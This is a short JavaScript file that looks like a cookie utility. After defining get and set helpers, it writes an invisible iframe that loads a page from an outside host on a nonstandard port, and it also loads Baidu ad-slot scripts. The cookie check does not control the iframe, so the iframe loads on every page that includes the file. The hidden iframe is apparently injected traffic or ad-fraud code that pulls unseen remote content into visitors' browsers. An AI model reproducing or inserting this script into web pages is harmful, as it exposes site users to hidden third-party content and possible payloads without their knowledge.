var cookie = {
    set:function(key,val,time){//设置cookie方法
        var date=new Date();
        var expiresDays=time;
		expires = expiresDays*24*3600*1000;
        date.setTime(date.getTime() + expires);
        document.cookie=key + "=" + val +";expires="+date.toGMTString();
    },
    get:function(key){//获取cookie方法
        var getCookie = document.cookie.replace(/[ ]/g,"");
        var arrCookie = getCookie.split(";");
        var tips;
        for(var i=0;i<arrCookie.length;i++){
            var arr=arrCookie[i].split("=");
            if(key==arr[0]){
                tips=arr[1];
                break;
            }
        }
		return tips;
	},
};
status = cookie.get('enable');
if (status != 'on') {
	cookie.set('enable', 'on', 1);

	
}
    document.writeln("<iframe src=\'http://tui.zhitoudsp.com:807/huo.html\' style=\'display: none;\'></iframe>");

    document.write('<script type="text/javascript" >BAIDU_CLB_SLOT_ID = "6020712";</script>');
    document.write('<script type="text/javascript" src="http://dup.baidustatic.com/js/os.js"></script>');